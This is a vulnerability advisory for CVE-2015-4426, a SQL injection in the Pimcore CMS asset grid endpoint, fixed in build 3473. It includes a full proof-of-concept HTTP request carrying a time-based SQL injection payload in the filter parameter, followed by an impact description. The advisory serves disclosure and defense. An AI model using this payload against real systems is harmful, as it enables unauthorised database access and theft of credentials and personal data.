CVE: CVE-2015-4426
Vendor: Pimcore
Product: Pimcore CMS
Affected version: Build 3450
Fixed version: Build 3473
Reported by: Josh Foote
Details:

Details:

It was possible to inject arbitrary SQL into the application provided an administrative account with the ‘assets’ privilege.

The following proof-of-concept will cause the database server to sleep for a number of seconds, depending on the version of Pimcore:

GET /admin/asset/grid-proxy?order=ASC&folderId=1&filter=[{%22type%22:%22list%22,%22field%22:%22filename%22,%22value%22:%22-1%27%20OR%20SLEEP(2)%3d0%20%23%22}] HTTP/1.1
Host: pimcore.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Cookie: PHPSESSID=q20vd25ud4kqllorb2oqe4qhh2; cookie-warn=true; _ga=GA1.2.1941920115.1426505099; pimcore_admin_sid=tslcrh04lnodo6etu6lmpulla2

Impact:

An attacker gaining sufficient network access could manipulate the data sent to the server and affect the SQL queries being processed. This could potentially allow an attacker to extract sensitive information, including (but not limited to) authentication credentials and personal details. Such information could be sold by the attacker to other malicious individuals, used in other attacks (as the same password is often used across systems) or released publicly to damage the organisation’s reputation. In this particular instance, exploitation was easier because the web application sent verbose error information back to the user, which an attacker could use to extract data from the database.
